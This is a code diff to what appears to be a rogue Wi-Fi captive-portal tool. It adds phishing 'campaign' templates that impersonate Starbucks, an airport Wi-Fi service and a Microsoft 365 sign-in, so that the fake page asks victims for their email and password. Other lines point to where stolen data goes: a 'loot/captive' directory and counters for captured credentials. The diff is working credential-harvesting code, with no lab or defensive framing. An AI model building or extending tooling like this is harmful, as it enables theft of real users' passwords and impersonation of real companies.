@@ -28,16 +28,43 @@ from urllib.parse import parse_qs
 LOOT_DIR = Path("loot/captive")
 
 
-# A deliberately generic fake-portal page. Looks like every public-Wi-Fi
-# splash you've ever seen: header, "Sign in to continue", email + password,
-# accept-terms checkbox, blue-ish submit. The {ssid} substitution is
-# filled in by CaptivePortal so the page references the SSID being
-# impersonated.
-PORTAL_HTML = """<!DOCTYPE html>
+# Campaigns / Templates
+TEMPLATES = {
+    "generic": {
+        "title": "Sign in to {ssid}",
+        "body": "Authentication required to access the network.",
+        "submit": "Connect",
+        "brand": "{ssid} &middot; Public Wi-Fi",
+        "color": "#1a73e8"
+    },
+    "starbucks": {
+        "title": "Starbucks Rewards Wi-Fi",
+        "body": "Sign in with your Starbucks account to enjoy free high-speed Wi-Fi.",
+        "submit": "Sign In",
+        "brand": "Starbucks Coffee Company",
+        "color": "#00704a"
+    },
+    "airport": {
+        "title": "Free Airport Wi-Fi",
+        "body": "Please provide your email to start your free 60-minute session.",
+        "submit": "Get Online",
+        "brand": "Airport Passenger Services",
+        "color": "#333"
+    },
+    "microsoft": {
+        "title": "Microsoft 365",
+        "body": "Your session has expired. Please sign in to continue.",
+        "submit": "Sign In",
+        "brand": "Microsoft Corporation",
+        "color": "#00a4ef"
+    }
+}
+
+PORTAL_HTML_BASE = """<!DOCTYPE html>
 <html><head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign in to {ssid}</title>
+<title>{title}</title>
 <style>
 body{{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:#f5f6f8;color:#222;}}
 .wrap{{max-width:380px;margin:60px auto;padding:24px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);}}
@@ -46,13 +73,13 @@ p.sub{{margin:0 0 22px;color:#666;font-size:14px;}}
 label{{display:block;font-size:13px;color:#444;margin-bottom:4px;margin-top:14px;}}
 input[type=email],input[type=password]{{width:100%;box-sizing:border-box;padding:11px 12px;border:1px solid #d8d8db;border-radius:8px;font-size:15px;}}
 .terms{{font-size:12px;color:#666;margin:18px 0;display:flex;align-items:flex-start;gap:8px;}}
-button{{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;margin-top:8px;}}
+button{{width:100%;padding:12px;background:{color};color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;margin-top:8px;}}
 .brand{{text-align:center;color:#888;font-size:12px;margin-top:20px;}}
 </style>
 </head><body>
 <div class="wrap">
-  <h1>Sign in to {ssid}</h1>
-  <p class="sub">Authentication required to access the network.</p>
+  <h1>{title}</h1>
+  <p class="sub">{body}</p>
   <form method="POST" action="/submit">
     <label>Email or username</label>
     <input type="email" name="email" autocomplete="email" required>
@@ -62,9 +89,9 @@ button{{width:100%;padding:12px;background:#1a73e8;color:#fff;border:0;border-ra
       <input type="checkbox" name="terms" checked required>
       <span>I agree to the network's terms of service.</span>
     </div>
-    <button type="submit">Connect</button>
+    <button type="submit">{submit}</button>
   </form>
-  <div class="brand">{ssid} &middot; Public Wi-Fi</div>
+  <div class="brand">{brand}</div>
 </div>
 </body></html>"""
 
@@ -114,7 +141,13 @@ class _Handler(BaseHTTPRequestHandler):
 
     def do_GET(self) -> None:  # noqa: N802
         # Anything except an obvious asset gets the portal page.
-        self._send_html(PORTAL_HTML.format(ssid=self.portal.ssid))
+        campaign = self.portal.campaign
+        tpl = TEMPLATES.get(campaign, TEMPLATES["generic"])
+        # Perform {ssid} substitution on all template fields
+        fmt_tpl = {k: (v.format(ssid=self.portal.ssid) if isinstance(v, str) else v) 
+                   for k, v in tpl.items()}
+        html = PORTAL_HTML_BASE.format(**fmt_tpl)
+        self._send_html(html)
 
     def do_POST(self) -> None:  # noqa: N802
         try:
@@ -133,10 +166,11 @@ class _Handler(BaseHTTPRequestHandler):
 class CaptivePortal:
     """Threaded HTTP server. Start once, stop once. Thread-safe counter."""
 
-    def __init__(self, ssid: str, bind: str = "192.168.45.1", port: int = 80) -> None:
+    def __init__(self, ssid: str, bind: str = "192.168.45.1", port: int = 80, campaign: str = "generic") -> None:
         self.ssid = ssid
         self.bind = bind
         self.port = port
+        self.campaign = campaign
         self.creds_captured = 0
         self.last_creds: dict[str, str] = {}
         self._csv_path: Optional[Path] = None
